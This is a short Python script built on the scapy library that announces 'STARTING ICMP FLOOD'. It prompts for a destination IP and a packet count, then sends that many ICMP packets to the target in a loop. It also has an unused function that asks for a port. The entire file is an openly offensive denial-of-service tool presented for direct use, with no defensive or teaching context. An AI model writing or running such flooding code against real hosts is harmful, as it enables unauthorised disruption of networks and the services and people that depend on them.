from scapy.all import *

def main():
    print()
    print("--------------------")
    print("STARTING ICMP FLOOD")
    print("--------------------")
    print()
    icmpflood()


def icmpflood():
    target = DestinationIP()
    cycle = input("Enter number of packets to be sent : ")
    if cycle == "":
        cycle = 1

    for x in range (0,int(cycle)):
        send(IP(dst=target)/ICMP())

def DestinationIP():
    dstIP = input("Destination IP: ")
    return dstIP
    
def DestinationPort():
    dstPort = input("Destination Port: ")
    return int(dstPort)
    
main()
